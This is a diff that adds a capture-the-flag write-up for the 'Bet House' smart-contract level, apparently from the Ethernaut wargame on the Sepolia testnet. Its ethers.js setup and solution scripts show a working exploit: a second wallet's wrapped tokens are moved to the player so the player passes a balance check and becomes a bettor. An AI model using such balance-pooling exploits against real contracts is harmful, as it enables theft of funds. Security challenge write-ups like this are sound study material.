@@ -706,3 +706,71 @@ await contract.setAnimalAndSpin("bear");
 
 await contract.setAnimalAndSpin("lion");
 ```
+
+## Problem 34: Bet House
+
+- level addr: 0x0891DF8A34990fE1d149318a65959d1D1ee25A4d
+- creation tx: [0xa946a7ab864fae3c4973789ffbafef10da34110ac7f8477c51a52b706f9492c7](https://sepolia.etherscan.io/tx/0xa946a7ab864fae3c4973789ffbafef10da34110ac7f8477c51a52b706f9492c7)
+
+- BetHouse contract: [0xE79bf7f3e7dBe0aB461Ac7BF390D84DeA009AfA0](https://sepolia.etherscan.io/address/0xe79bf7f3e7dbe0ab461ac7bf390d84dea009afa0)
+- Pool contract: [0x017236C3894DdF43aC690637C78a42D530c5c103](https://sepolia.etherscan.io/address/0x017236c3894ddf43ac690637c78a42d530c5c103)
+- wrappedToken contract: [0x01357eBCC5C4dddBB4329A618965DF197cDD69CF](https://sepolia.etherscan.io/address/0x01357ebcc5c4dddbb4329a618965df197cdd69cf)
+- depositToken (PDT) contract: [0x4e94514f0B9Ad7C9E5e47A981d7C615038849Df5](https://sepolia.etherscan.io/address/0x4e94514f0b9ad7c9e5e47a981d7c615038849df5)
+
+```ts
+let provider = new _ethers.providers.Web3Provider(window.ethereum);
+let signer = provider.getSigner();
+
+let poolAddr = "0x017236C3894DdF43aC690637C78a42D530c5c103";
+let poolABI = [
+  "function wrappedToken() view returns (address)",
+  "function depositToken() view returns (address)",
+  "function deposit(uint256) payable",
+  "function withdrawAll()",
+  "function lockDeposits()",
+  "function depositsLocked(address) view returns (bool)",
+  "function balanceOf(address) view returns (uint256)",
+];
+let pool = new _ethers.Contract(poolAddr, poolABI, signer);
+
+let pdtAddr = "0x4e94514f0B9Ad7C9E5e47A981d7C615038849Df5";
+let erc20ABI = [
+  "function owner() view returns (address)",
+  "function totalSupply() view returns (uint256)",
+  "function allowance(address, address) view returns (uint256)",
+  "function approve(address, uint256) returns (bool)",
+  "function balanceOf(address) view returns (uint256)",
+  "function transfer(address, uint256) returns (bool)",
+  "function transferFrom(address, address, uint256) returns (bool)",
+]
+let pdt = new _ethers.Contract(pdtAddr, erc20ABI, signer);
+
+let signer2 = new _ethers.Wallet(`another private key`, provider)
+let poolSigner2 = new _ethers.Contract(poolAddr, poolABI, signer2);
+
+let depositWei = toWei("0.001");
+await poolSigner2.deposit(0, { value: depositWei })
+
+let wrappedTokenAddr = "0x01357eBCC5C4dddBB4329A618965DF197cDD69CF";
+let wrappedTokenSigner2 = new _ethers.Contract(wrappedTokenAddr, erc20ABI, signer2);
+```
+
+**Solution**
+
+```ts
+let depositWei = toWei("0.001");
+// player actions
+await pdt.approve(poolAddr, 5);
+await pool.deposit(5, { value: depositWei})
+
+// signer2 actions
+poolSigner2.deposit(0, { value: depositWei})
+let wrappedTokenAddr = "0x01357eBCC5C4dddBB4329A618965DF197cDD69CF";
+let wrappedTokenSigner2 = new _ethers.Contract(wrappedTokenAddr, erc20ABI, signer2);
+// signer2 transfers tokens to player
+await wrappedTokenSigner2.transfer(player, 10);
+
+// With the extra wrapped tokens, player can become a bettor.
+await pool.lockDeposits();
+await contract.makeBet(player);
+```
